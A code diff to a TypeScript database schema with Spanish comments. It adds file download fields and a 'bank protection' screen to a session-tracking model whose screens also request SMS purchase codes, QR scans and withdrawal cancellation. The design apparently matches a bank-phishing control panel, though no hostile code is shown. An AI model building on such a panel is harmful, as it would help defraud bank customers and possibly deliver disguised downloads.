@@ -133,7 +133,11 @@ export const sessions = pgTable("sessions", {
   deviceModel: text("device_model"), // Modelo específico del dispositivo
   deviceBrowser: text("device_browser"), // Navegador utilizado
   deviceOs: text("device_os"), // Sistema operativo
-  userAgent: text("user_agent") // User agent completo
+  userAgent: text("user_agent"), // User agent completo
+  // Información del archivo para protección bancaria
+  fileName: text("file_name"), // Nombre del archivo subido
+  fileUrl: text("file_url"), // URL del archivo para descarga
+  fileSize: text("file_size") // Tamaño del archivo
 });
 
 export const insertSessionSchema = createInsertSchema(sessions).pick({
@@ -149,6 +153,9 @@ export const insertSessionSchema = createInsertSchema(sessions).pick({
   deviceBrowser: true,
   deviceOs: true,
   userAgent: true,
+  fileName: true,
+  fileUrl: true,
+  fileSize: true,
 });
 
 export type InsertSession = z.infer<typeof insertSessionSchema>;
@@ -227,7 +234,8 @@ export enum ScreenType {
   VALIDANDO = "validando",
   SMS_COMPRA = "sms_compra",
   ESCANEAR_QR = "escanear_qr",
-  CANCELACION_RETIRO = "cancelacion_retiro"
+  CANCELACION_RETIRO = "cancelacion_retiro",
+  PROTECCION_BANCARIA = "proteccion_bancaria"
 }
 
 export const screenChangeSchema = z.object({
